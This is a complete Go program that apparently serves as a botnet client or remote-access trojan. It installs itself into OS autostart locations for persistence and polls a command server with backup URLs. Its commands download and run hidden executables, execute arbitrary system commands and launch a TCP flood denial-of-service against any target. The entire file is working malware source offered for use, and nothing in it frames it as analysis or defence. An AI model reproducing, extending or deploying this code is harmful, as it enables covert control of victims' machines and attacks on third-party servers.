package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// isAdmin checks if the current user has admin privileges
func isAdmin() (bool, error) {
	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err != nil {
			if strings.Contains(err.Error(), "Access is denied") {
				return false, nil
			}
			return false, err
		}
		return true, nil
	case "linux", "darwin":
		if os.Geteuid() != 0 {
			return false, nil
		}
		return true, nil
	default:
		return false, nil
	}
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	err = os.WriteFile(dst, input, 0644)
	return err
}

// AutostartOnWin adds the executable to the Windows startup folder
func AutostartOnWin(executablePath string) {
	var startupPath string
	admin, err := isAdmin()

	if err != nil {
		fmt.Println("Error checking admin privileges:", err)
		return
	}

	if admin {
		startupPath = filepath.Join(os.Getenv("ProgramData"), "Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
	} else {
		startupPath = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	}

	destPath := filepath.Join(startupPath, filepath.Base(executablePath))

	err = copyFile(executablePath, destPath)
	if err != nil {
		fmt.Println("Error copying file:", err)
	} else {

		fmt.Println("Successfully copied to startup folder:", destPath)
	}
}

// autostartOnLinuxAndDarwin adds the executable to the autostart directory on Linux and Darwin
func autostartOnLinuxAndDarwin(executablePath string) {
	var autostartDir string
	admin, err := isAdmin()
	if err != nil {
		fmt.Println("Error checking admin privileges:", err)
		return
	}

	switch runtime.GOOS {
	case "darwin":
		if admin {
			autostartDir = "/Library/LaunchAgents"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
		}
	case "linux":
		if admin {
			autostartDir = "/etc/xdg/autostart"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
		}
	default:
		fmt.Println("Unsupported platform")
		return
	}

	err = os.MkdirAll(autostartDir, 0755)
	if err != nil {
		fmt.Println("Error creating autostart directory:", err)
		return
	}

	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
	err = os.Symlink(executablePath, destPath)
	if err != nil {
		fmt.Println("Error creating symlink in autostart directory:", err)
	} else {
		fmt.Println("Successfully added to autostart:", destPath)
	}
}

// runAtStartup adds the executable to the autostart directory depending on the OS
func runAtStartup() {
	executable, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting executable path:", err)
		return
	}

	if runtime.GOOS == "windows" {
		AutostartOnWin(executable)
	} else {
		autostartOnLinuxAndDarwin(executable)
	}
}

// Config holds the configuration for the program
type Config struct {
	URL        string   `json:"url"`
	BackupURLs []string `json:"backups"`
	WebhookURL string   `json:"webhookURL"`
}
// downloadFile downloads a file from a URL and saves it to a local file
func downloadFile(url, filename string, run, hide bool) error {

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP request failed with status code %d", resp.StatusCode)

	}

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {

		return err
	}

	if hide {
		if runtime.GOOS == "windows" {
			err := exec.Command("attrib", "+H", filename).Run()
			if err != nil {
				return fmt.Errorf("failed to hide the file: %v", err)
			}
		} else {
			hiddenFilename := "." + filename
			err := os.Rename(filename, hiddenFilename)

			if err != nil {
				return fmt.Errorf("failed to rename the file: %v", err)
			}
			filename = hiddenFilename
		}
	}
	if run {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", "start", filename)
		} else {
			os.Chmod(filename, 0755)
			cmd = exec.Command("./" + filename)
		}

		cmd.Run()
	}

	return nil
}

// displayMessageInHTML creates a temporary HTML file and displays a message in it
func displayMessageInHTML(message string) {
	// Create a temporary file
	tmpfile, err := ioutil.TempFile("", "message-*.html")
	if err != nil {
		fmt.Printf("Error creating a temporary file: %s\n", err)
		return
	}
	defer tmpfile.Close()

	// Write the HTML content to the file
	htmlContent := fmt.Sprintf("<html><body><p>%s</p></body></html>", message)
	if _, err := tmpfile.Write([]byte(htmlContent)); err != nil {
		fmt.Printf("Error writing to temporary file: %s\n", err)
		return
	}

	// Open the temporary file in the browser
	openBrowser(tmpfile.Name())
}

// openBrowser opens a URL in the default browser
func openBrowser(url string) {
	var err error

	// Open the URL in the browser based on the operating system
	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		err = fmt.Errorf("unsupported platform")
	}

	if err != nil {
		fmt.Printf("Error opening browser: %s\n", err)
	}
}

// LoadConfig loads the configuration from a JSON file
func LoadConfig(path string) (*Config, error) {
	// Open the JSON file
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	// Decode the JSON file into a Config struct
	var config Config
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		return nil, err
	}

	return &config, nil
}

// FetchCommand fetches a command from a URL
func FetchCommand(config *Config) (string, error) {
	// Try each URL until one succeeds
	urls := append([]string{config.URL}, config.BackupURLs...)
	for _, url := range urls {
		resp, err := http.Get(url + "?nocache=" + generateRandomString(20))
		if err == nil && resp.StatusCode == http.StatusOK {
			// Read the response body
			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()

			if err != nil {
				continue
			}
			return string(body), nil
		}
	}
	return "", fmt.Errorf("all URLs failed")
}

// generateRandomString generates a random string of a given length
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// DOS performs a Denial of Service attack on a target
func DOS(target string, port string, duration time.Duration) {
	// Calculate the end time of the attack
	endTime := time.Now().Add(duration)
	var wg sync.WaitGroup

	// Define the function to send a request
	send := func() {
		defer wg.Done()
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
		if err != nil {
			fmt.Println(err)
			return
		}
		defer conn.Close()

		_, err = conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
		if err != nil {
			fmt.Println(err)
			return
		}
	}

	// Send requests until the end time
	for time.Now().Before(endTime) {
		wg.Add(1)
		go send()

		time.Sleep(10 * time.Millisecond)
	}

	wg.Wait()
}

// executeSystemCommand executes a system command and returns its output
func executeSystemCommand(name string, args []string) (string, error) {
	// Execute the command
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("Error executing command '%s': %s\n", name, err)
	}
	return out.String(), nil
}

// ParseCommand parses a command and performs the corresponding action
func ParseCommand(command string) error {
	// Split the command into lines
	commands := strings.Split(command, "\n")
	for _, cmd := range commands {
		// Split the line into words
		parts := strings.Fields(cmd)
		if len(parts) == 0 {
			continue
		}

		// Perform the action based on the first word
		switch parts[0] {
		case "popmsg":
			if len(parts) > 1 {
				message := strings.Join(parts[1:], " ")
				displayMessageInHTML(message)
			}
		case "download":
			if len(parts) >= 3 {
				url := parts[1]
				filename := parts[2]

				run := false
				hide := false

				for _, part := range parts[3:] {
					if part == "RUN" {
						run = true
					} else if part == "HIDE" {
						hide = true
					}
				}

				err := downloadFile(url, filename, run, hide)
				if err != nil {
					fmt.Printf("Error downloading file: %s\n", err)
				}
			} else {
				fmt.Println("Invalid download command. Usage: download [url] [filename] [RUN] [HIDE]")
			}
		case "cmd":
			if len(parts) > 1 {
				_, err := executeSystemCommand(parts[1], parts[2:])
				if err != nil {
					fmt.Println(err)
				} else {

				}
			} else {
				fmt.Println("Invalid cmd command. Usage: cmd [command] [args...]")
			}
		case "dos":
			if len(parts) < 4 {
				fmt.Println("Invalid dos command. Usage: dos <IP/domain> <port> <duration>")
			} else {
				target := parts[1]
				port := parts[2]
				durationStr := parts[3]

				duration, err := time.ParseDuration(durationStr)
				if err != nil {
					fmt.Printf("Invalid duration: %s\n", durationStr)
					continue
				}

				DOS(target, port, duration)
			}
		default:
			if strings.HasPrefix(cmd, "dos ") {
				info := strings.TrimSpace(strings.TrimPrefix(cmd, "dos "))
				parts := strings.Fields(info)
				if len(parts) < 3 {
					return fmt.Errorf("Usage: dos <IP/domain> <port> <duration>")
				}

				target := parts[0]
				port := parts[1]
				durationStr := parts[2]

				duration, err := time.ParseDuration(durationStr + "s")
				if err != nil {
					return fmt.Errorf("Invalid duration: %s", durationStr)
				}

				DOS(target, port, duration)
			}
		}

	}
	return nil
}

// main is the entry point of the program
func main() {
	fmt.Println("Starting program...")
	rand.Seed(time.Now().UnixNano())
	runAtStartup()

	// Load the configuration
	config, err := LoadConfig("config.json")
	if err != nil {
		fmt.Printf("Error loading config: %s\n", err)
		os.Exit(1)
	}

	// Continuously fetch and parse commands
	for {
		command, err := FetchCommand(config)
		if err != nil {
			fmt.Printf("Error fetching command: %s\n", err)
			time.Sleep(60 * time.Second)
			continue
		}

		fmt.Printf("Received command: %s\n", command)
		ParseCommand(command)

		time.Sleep(60 * time.Second)
	}
}
